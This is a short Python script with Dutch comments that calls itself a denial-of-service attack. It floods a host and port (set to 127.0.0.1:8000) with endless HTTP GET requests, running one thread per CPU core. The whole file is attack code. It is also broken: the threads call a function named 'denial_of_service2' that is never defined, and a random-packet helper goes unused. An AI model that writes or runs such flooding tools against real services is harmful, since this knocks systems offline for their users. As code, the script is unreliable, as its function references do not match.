import socket
import threading
import random
import psutil

# Functie om een willekeurig UDP-pakket van een gegeven grootte te maken
def create_random_packet(packet_size):
    packet = ""
    for i in range(0, packet_size):
        packet += chr(random.randint(0, 255))
    return packet

# Functie om het maximale aantal CPU-cores te verkrijgen
def get_max_cores():
    max_thread_count = psutil.cpu_count(logical=True)
    return max_thread_count

# Functie die een Denial of Service (DoS) aanval uitvoert met HTTP GET-verzoeken
def denial_of_service():
    target_host = "127.0.0.1"  # Het doel-IP-adres waarnaar de aanval wordt gericht
    target_port = 8000        # De doelpoort waarnaar de aanval wordt gericht
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Een TCP-socket maken
    sock.connect((target_host, target_port))  # Verbinding maken met het doel-IP en de poort
    while True:
        try:
            # Een HTTP GET-verzoek verzenden naar het doel
            sock.send(f"GET /index.html HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
        except Exception as e:
            # Als er een fout optreedt, de aanval opnieuw starten
            denial_of_service2()

# Functie om de DoS-functie uit te voeren met meerdere threads
def execute_dos_function():
    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
    for i in range(0, max_thread_count):
        try:
            thread = threading.Thread(target=denial_of_service2)  # Een nieuwe thread maken voor elke aanval
            thread.start()  # De thread starten
            print(f"Thread {i} started")  # Afdrukken dat de thread is gestart
        except Exception as e:
            print(f"Error: {e}")

# Het hoofdprogramma dat wordt uitgevoerd wanneer het script wordt uitgevoerd
if __name__ == "__main__":
    execute_dos_function()
